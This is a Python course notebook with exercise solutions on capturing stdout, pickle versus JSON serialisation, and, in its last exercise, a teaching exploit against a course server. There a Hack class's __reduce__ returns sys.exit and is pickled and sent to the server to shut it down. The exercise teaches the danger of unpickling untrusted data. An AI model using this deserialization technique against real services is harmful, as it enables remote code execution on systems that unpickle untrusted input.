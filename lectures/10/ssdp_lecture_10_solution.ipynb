{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise 1: Capturing output\n",
    "\n",
    "## (a)\n",
    "\n",
    "Complete the code below so that the ``StdoutCapture`` class can be used as a context manager to capture all output printed in a ``with`` block.\n",
    "\n",
    "**Hints:**\n",
    "\n",
    "- By default, all messages that are printed from within code are written to the ``sys.stdout`` stream. ``sys.stdout`` is a variable just as any other in Python so you can simply replace it with another stream object\n",
    "   such as ``io.StringIO``.\n",
    "- Don't forget to restore the value of ``sys.stdout`` when leaving the ``with`` block. Otherwise Python \n",
    "  will not print any output anymore.\n",
    "- You can access the text written to an ``io.StrinIO`` object using the ``getvalue`` method."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "import io\n",
    "\n",
    "class StdoutCapture():\n",
    "    \"\"\"\n",
    "    A context manager that captures all output written to ``sys.stdout``.\n",
    "    \"\"\"\n",
    "    def __init__(self):\n",
    "        self.capture = io.StringIO()\n",
    "        self.old_capture = None\n",
    "    \n",
    "    def __enter__(self):\n",
    "        self.old_capture = sys.stdout\n",
    "        sys.stdout = self.capture\n",
    "        return self\n",
    "        \n",
    "    def __exit__(self, *args):\n",
    "        sys.stdout = self.old_capture\n",
    "        return False\n",
    "    \n",
    "    def print(self):\n",
    "        \"\"\" Print the output captured by the StdoutCapture object.  \"\"\"\n",
    "        print(self.capture.getvalue())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If your implementation is correct, the code below should not show any output."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "with StdoutCapture() as capture:\n",
    "    print(\"This should not be printed directly.\")\n",
    "    print(\"This shouldn't either.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you restored ``sys.stdout`` correctly then the code below should print the captured output:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "This should not be printed directly.\n",
      "This shouldn't either.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "capture.print()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## (b)\n",
    "\n",
    "Now rewrite your stdout capture using the ``contextmanager`` decorator from the ``contextlib`` module."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "from contextlib import contextmanager\n",
    "\n",
    "@contextmanager\n",
    "def stdout_capture():\n",
    "    old_stdout = sys.stdout\n",
    "    sys.stdout = io.StringIO()\n",
    "    try:\n",
    "        yield sys.stdout\n",
    "    finally:\n",
    "        sys.stdout = old_stdout"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "with stdout_capture() as capture:\n",
    "    print(\"This should not be printed directly.\")\n",
    "    print(\"This shouldn't either.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "This should not be printed directly.\n",
      "This shouldn't either.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(capture.getvalue())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise 2: ``pickle`` vs. ``json``.\n",
    "\n",
    "## (a)\n",
    "\n",
    "Use picke to store the ``record`` object created below to a file and load it back into the object ``record_loaded``."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "from dataclasses import dataclass\n",
    "@dataclass\n",
    "class Record:\n",
    "    id: int\n",
    "    name: str\n",
    "    properties: list"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "record = Record(42, \"Peter\", [\"some\", \"properties\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "with open(\"record.pckl\", \"wb\") as file:\n",
    "    pickle.dump(record, file)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"record.pckl\", \"rb\") as file:\n",
    "    record_loaded = pickle.load(file)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "assert record == record_loaded"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "�\u0003c__main__\r\n",
      "Record\r\n",
      "q\u0000)�q\u0001}q\u0002(X\u0002\u0000\u0000\u0000idq\u0003K*X\u0004\u0000\u0000\u0000nameq\u0004X\u0005\u0000\u0000\u0000Peterq\u0005X\r\n",
      "\u0000\u0000\u0000propertiesq\u0006]q\u0007(X\u0004\u0000\u0000\u0000someq\bh\u0006eub."
     ]
    }
   ],
   "source": [
    "%cat record.pckl"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## (b)\n",
    "\n",
    "Write default encode and decoder classes in order to store the record object using the ``json`` module."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "from json import JSONEncoder, JSONDecoder\n",
    "\n",
    "class RecordEncoder(JSONEncoder):\n",
    "    def default(self, obj):\n",
    "        if isinstance(obj, Record):\n",
    "            return {\"Record\" : [record.id, record.name, record.properties]}\n",
    "        return JSONEncoder.default(self, obj)\n",
    "    \n",
    "class RecordDecoder(JSONDecoder):\n",
    "    def __init__(self, *args, **kwargs):\n",
    "        super().__init__(*args, object_hook=self.object_hook, **kwargs)\n",
    "        \n",
    "    def object_hook(self, obj):\n",
    "        if \"Record\" in obj:\n",
    "            return Record(*obj[\"Record\"])\n",
    "        return obj"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"record.json\", \"w\") as file:\n",
    "    json.dump([record, record], file, cls=RecordEncoder)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"record.json\", \"rb\") as file:\n",
    "    record_loaded = json.load(file, cls=RecordDecoder)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[Record(id=42, name='Peter', properties=['some', 'properties']),\n",
       " Record(id=42, name='Peter', properties=['some', 'properties'])]"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "record_loaded"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise 3: Arbitrary code execution exploit\n",
    "\n",
    "In this exercise, you will use a security vulnerability in Python's `pickle` data format to shutdown a simple server application. Below you find two functions to connect to the server. The first one, ``get_server_state`` can be used to query the current state of the server. It will tell you whether the server is still running. The second function, ``send_to_server`` allows you to send an arbitrary object to the server.\n",
    "\n",
    "Each breakout room will connect to its own server. Your task, as a team, is to take down your server. You can do this using the ``send_to_server`` with a customized Python object.\n",
    "\n",
    "**HINTS:**\n",
    "- Have a look at the ``__reduce__`` special method used by the ``pickle`` module. Used correctly, it will allow\n",
    "  to execute any standard library function on the server.\n",
    "- With this, all you need to figure out is how you can shutdown Python from inside Python."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "BREAKOUT_ROOM_NUMBER = 6"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "PORT = 8000 + BREAKOUT_ROOM_NUMBER\n",
    "HOST = \"titanite.rss.chalmers.se\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import io\n",
    "import pickle\n",
    "\n",
    "def get_server_state():\n",
    "    \"\"\"Prints the state of the server.\"\"\"\n",
    "    try:\n",
    "        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "            s.connect((HOST, PORT))\n",
    "            s.sendall(b\"0000\")\n",
    "            response = s.recv(1024)\n",
    "        print(str(response.decode()))\n",
    "    except ConnectionRefusedError:\n",
    "        print(\"Congratulations! Looks like you managed to shut the server down!\")\n",
    "    \n",
    "def send_to_server(obj):\n",
    "    \"\"\"\n",
    "    Pickles and sends an object to the server which tries to unpickle it and\n",
    "    returns a string representation of the received object.\n",
    "    \n",
    "    Args:\n",
    "        obj: A Python object to send to the server.\n",
    "    \"\"\"\n",
    "    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "        s.connect((HOST, PORT))\n",
    "        all_data = io.BytesIO(pickle.dumps(obj))\n",
    "        while True:\n",
    "            chunk = all_data.read(1024)\n",
    "            s.sendall(chunk)\n",
    "            if len(chunk) < 1024:\n",
    "                break\n",
    "        response = s.recv(1024)\n",
    "        print(str(response.decode()))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "class Hack:\n",
    "    def __reduce__(self):\n",
    "        return sys.exit, (0,)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "send_to_server(Hack())"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
